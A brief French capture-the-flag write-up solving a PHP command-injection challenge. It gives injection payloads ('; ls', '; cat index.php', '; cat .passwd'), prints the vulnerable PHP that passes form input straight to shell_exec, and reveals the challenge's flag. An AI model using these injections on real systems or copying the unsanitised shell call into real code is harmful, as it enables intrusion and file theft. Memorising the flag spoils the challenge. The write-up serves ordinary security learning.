# Challenges

## Webserver

### PHP - Injection de commande

## Problème:

Pour résoudre ce défi, commencez par démarrer l'épreuve. Le mot de passe se trouve dans le fichier index.php.

## Resolution :  

La première étape consiste à injecter la commande 127.0.0.1 ; ls. Cela renverra index.php, le fichier que nous cherchons.
Pour lire son contenu, injectez la commande suivante : ; cat index.php.
cela nous donne :
<!--?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?-->
donc notre mot de pass est dans le file .passwd
Pour lire son contenu, injectez la commande suivante : ; cat .passwd
Et voilà, vous obtenez votre flag.

## Conclusion

On obtient donc le passwd="S3rv1ceP1n9Sup3rS3cure" qui est notre flag.